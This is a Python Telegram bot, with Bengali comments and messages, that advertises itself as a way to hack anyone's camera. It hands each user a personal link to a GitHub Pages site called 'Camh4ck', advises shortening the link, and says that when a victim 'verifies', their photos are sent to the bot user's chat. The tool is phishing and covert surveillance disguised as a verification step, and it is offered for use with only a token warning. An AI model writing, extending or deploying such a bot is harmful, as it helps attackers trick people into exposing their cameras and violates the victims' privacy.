import telebot
from telebot import types
import time

# আপনার নতুন বোট টোকেন এখানে দিন
BOT_TOKEN = "নতুন_টোকেন_এখানে_দিন" 
bot = telebot.TeleBot(BOT_TOKEN)

# আপনার GitHub পেজের লিঙ্ক
BASE_URL = "https://myw4371-a11y.github.io/Camh4ck/"

def main_keyboard():
    markup = types.ReplyKeyboardMarkup(row_width=2, resize_keyboard=True)
    markup.add(types.KeyboardButton('/start'), types.KeyboardButton('/link'))
    return markup

@bot.message_handler(commands=['start'])
def send_welcome(message):
    welcome_text = (
        f"হ্যালো {message.from_user.first_name}!\n"
        "Welcome to 50/50 bot\n"
        "এর সাহায্যে আপনি যে কারো ক্যামেরা হ্যাক (Hack) করতে পারবেন।\n\n"
        "⚠️ সতর্কবার্তা: কেউ এটি খারাপ কাজে ব্যবহার করবেন না।\n\n"
        "নিচের বাটন থেকে আপনার লিঙ্ক তৈরি করুন।"
    )
    bot.send_message(message.chat.id, welcome_text, reply_markup=main_keyboard())

@bot.message_handler(commands=['link'])
def send_link(message):
    personal_link = f"{BASE_URL}?id={message.chat.id}"
    response_text = (
        "✅ আপনার ভেরিফিকেশন লিঙ্ক তৈরি হয়েছে।\n\n"
        f"🔗 ক্যামেরা অ্যাক্সেস লিঙ্ক: {personal_link}\n\n"
        "লিঙ্কটি ছোট করুন:\nhttps://lc.cx/en\n\n"
        "এই লিঙ্কটি শেয়ার করুন। কেউ ভেরিফাই করলে ছবি এখানে আসবে।"
    )
    bot.send_message(message.chat.id, response_text, reply_markup=main_keyboard())

if __name__ == "__main__":
    # পুরোনো সেশন ক্লিয়ার করার জন্য
    bot.remove_webhook()
    time.sleep(1)
    print("বোটটি সচল আছে...")
    bot.infinity_polling(none_stop=True, timeout=60)
